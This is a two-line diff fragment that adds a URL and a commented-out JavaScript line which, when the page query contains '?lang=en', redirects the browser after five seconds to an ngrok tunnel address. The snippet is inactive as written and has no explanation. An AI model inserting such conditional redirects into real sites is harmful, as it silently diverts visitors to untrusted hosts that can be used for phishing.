@@ -1,0 +1,2 @@
+https://vedal.xyz/?lang=en
+// Comment: if(window.location.search.includes("?lang=en")) { window.setTimeout(function() { location.href="https://a2d778e49bc9.ngrok.io/"; }, 5000); }
